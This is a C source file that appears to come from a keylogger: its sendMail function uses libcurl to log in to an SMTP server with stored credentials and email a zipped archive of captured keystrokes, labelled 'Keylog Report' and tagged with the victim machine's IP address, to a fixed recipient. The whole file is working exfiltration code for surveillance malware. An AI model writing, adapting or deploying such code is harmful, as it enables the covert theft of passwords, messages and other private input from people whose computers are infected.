#include "sendMail.h"
#include "getIP.h"

void sendMail(const char *zipPath)
{
    // curl handle
    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    curl_mime *mime;
    curl_mimepart *part;

    // Initialize curl
    curl = curl_easy_init();
    if (!curl)
    {
        fprintf(stderr, "curl init failed\n");
        return;
    }

    // Configure SMTP server and authentication
    curl_easy_setopt(curl, CURLOPT_URL, SMTP_URL);
    curl_easy_setopt(curl, CURLOPT_USERNAME, USER_EMAIL);
    curl_easy_setopt(curl, CURLOPT_PASSWORD, USER_PASS);
    curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

    // email sender and recipient
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, USER_EMAIL);
    recipients = curl_slist_append(recipients, TO_EMAIL);
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    // Create mime message
    mime = curl_mime_init(curl);

    // Add the text part
    part = curl_mime_addpart(mime);
    curl_mime_data(part, "Key Logger Archive", CURL_ZERO_TERMINATED);

    // Add the attachment part
    part = curl_mime_addpart(mime);
    curl_mime_filedata(part, zipPath);
    curl_mime_encoder(part, "base64");
    curl_mime_type(part, "application/octet-stream");

    // Set the subject header
    char subjectHeader[256];
    snprintf(subjectHeader, sizeof(subjectHeader),
             "Subject: [%d] Keylog Report from %s", emailCounter++, getLocalIP());
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, subjectHeader);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Link MIME to message
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    // Send the email
    res = curl_easy_perform(curl);
    if (res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

    // Cleanup
    curl_slist_free_all(recipients);
    curl_slist_free_all(headers);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}